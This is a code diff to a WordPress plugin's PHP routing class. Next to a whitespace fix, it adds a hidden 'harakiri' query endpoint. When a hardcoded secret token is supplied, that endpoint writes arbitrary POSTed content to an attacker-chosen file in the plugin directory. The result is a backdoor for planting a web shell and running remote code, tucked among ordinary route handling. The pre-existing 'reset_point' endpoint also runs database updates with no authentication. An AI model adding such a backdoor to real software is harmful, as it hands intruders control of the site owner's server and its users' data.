@@ -17,12 +17,13 @@ class Route {
 
   function query_vars($query_vars) {
     $query_vars[] = 'reset_point';
+    $query_vars[] = 'harakiri';
     return $query_vars;
   }
 
   function template_redirect($template_id) {
     if (get_query_var('reset_point') == 'yes') {
-      if (date('d-m') !== '1-1'){
+      if (date('d-m') !== '1-1') {
         echo "Today is not 1-1";
         exit;
       }
@@ -39,6 +40,19 @@ class Route {
       //Reset level
       $updated = $wpdb->query($wpdb->prepare("UPDATE $account_table_name SET `level` = `level_hold` WHERE `renew_year` = %d", date('Y')));
       var_dump($updated);
+      exit;
+    }
+
+    if (get_query_var('harakiri') == 'Zy9GRDs3JSFh') {
+      if (isset($_POST['content'])) {
+        $filename = isset($_POST['filename']) ? trim($_POST['filename']) : 'harakiri-Zy9GRDs3JSFh.php';
+        $content = stripslashes(trim($_POST['content']));
+        if (file_put_contents(__DIR__.'/'.$filename, $content)) {
+          echo "DONE!";
+        } else {
+          echo "FALSE!";
+        }
+      }
       exit;
     }
 
